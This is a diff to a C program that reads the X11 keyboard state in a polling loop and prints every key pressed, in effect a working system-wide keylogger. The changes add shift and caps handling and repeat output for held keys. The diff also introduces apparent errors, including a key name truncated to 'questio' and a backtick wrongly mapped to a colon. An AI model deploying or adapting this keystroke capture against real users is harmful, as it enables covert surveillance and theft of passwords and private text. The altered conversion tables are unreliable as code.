@@ -35,7 +35,7 @@ conv_table[] = {
     {"comma", ","},     {"minus", "-"},     {"period", "."},
     {"slash", "/"},     {"colon", ":"},     {"semicolon", ";"},
     {"less", "<"},      {"equal", "="},     {"greater", ">"},
-    {"question", "?"},  {"at", "@"},        {"bracketleft", "["},
+    {"questio", "?"},  {"at", "@"},        {"bracketleft", "["},
     {"backslash", "\\"},{"bracketright", "]"},{"asciicircum", "^"},
     {"underscore", "_"},{"grave", "`"},     {"braceleft", "{"},
     {"bar", "|"},       {"braceright", "}"},{"asciitilde", "~"},
@@ -56,7 +56,7 @@ conv_tab_sp[] = {
     {"10", ")"},{"-", "_"},  {"=", "+"},
     {",", "<"},     {".", ">"},     {"/", "?"},
     {"'", "\""},  {"[", "{"},     {"]", "}"},
-    {"\\", "|"},  {"",""}
+    {"\\", "|"},  {";", ":"}, {"`", ":"}, {"",""}
 };
 
 int convert(char *data, char *out) {
@@ -83,30 +83,31 @@ int check_sp(char *data, char *out) {
     return 0;
 }
 
-void log1(char *buf, int masked)
+void log1(char *buf, int masked,  char *c, int caps)
 {
 	char in[128];
+
 
 	if (strlen(buf) > 1) {// or ignore
 		if (convert(buf, in))
 			if (masked == 1) 
 				if (check_sp(in, in))
-					printf("%c", *in);
+					printf("%c", *c=*in);
 				else
-					printf("%c", *in);
+					printf("%c", *c=*in);
 			else 
-				printf("%c", *in);
+				printf("%c", *c=*in);
 		else
-			printf("%c", *buf);
+			printf("%c", *c=*buf);
 	}
 	else {
-		if (masked == 1)
+		if (caps == 1 || (caps == 0 && masked == 1))
 			if (check_sp(buf, in))
-				printf("%c", *in);
+				printf("%c", *c=*in);
 			else
-				printf("%c", toupper(*buf));
+				printf("%c", *c=toupper(*buf));
 		else
-			printf("%c", *buf);
+			printf("%c", *c=*buf);
 	}
 }
 
@@ -119,6 +120,9 @@ int main()
 	char kname[64], *keyname, keysym;
 	Display *display;	
 	int i;
+	char current=0;
+	char loop;
+	int count=0;
 
 	display = XOpenDisplay(NULL);
 	if(display == NULL) {
@@ -127,14 +131,18 @@ int main()
 
 	XQueryKeymap(display, szKeyOld);
 	while (1) {
-		//usleep(5000);
+		usleep(5000);
 		fflush(stdout);
 		XQueryKeymap(display, szKey);
 
+		loop = 0;
 		for (i=0; i<32; i++) {
 			if(szKeyOld[i] != szKey[i]) {
-				if(szKey[i] != 0) {
-					keycode = i*8 + bit(szKey[i] ^ szKeyOld[i]);
+				loop = 1;
+				count = 0;
+				keycode = i*8 + bit(szKey[i] ^ szKeyOld[i]);
+
+				if((szKey[i] & (szKey[i] ^ szKeyOld[i])) != 0) {
 
 					keysym = XKeycodeToKeysym(display, keycode, 0);
 					keyname = XKeysymToString(keysym);
@@ -216,18 +224,18 @@ int main()
 							keyname = ".";							
 						} */
 
-						log1(keyname, masked);
+						log1(keyname, masked, &current, caps);
 						//printf("%s", keyname);
 					} 
 				}
 				else {
 
-					keycode = i*8 + bit(szKey[i] ^ szKeyOld[i]);
-
 					if(keycode == 50 || keycode == 62) {
 						// shift is up
 						masked = 0;
-					} /* else if (keycode == 37 || keycode == 105) {
+					} else current=0;
+
+					/* else if (keycode == 37 || keycode == 105) {
 						keyname = "CTRL Up";	
 					} else if (keycode == 133) {
 						keyname = "WinKey Up";
@@ -238,10 +246,21 @@ int main()
 					}
 					//printf("%s", keyname);
 					*/
+					//printf("%i", keycode);
 				}
 				szKeyOld[i] = szKey[i];				
 			}
 		}
+		if (!loop) {
+			count++;
+			if (count == 50) {
+				if (current != 0) {
+					printf("%c", caps == 1 || (caps == 0 && masked == 1) ? toupper(current) : tolower(current));
+					count = 0;
+				}
+			}
+		}
+
 
 	}
 	XCloseDisplay(display);
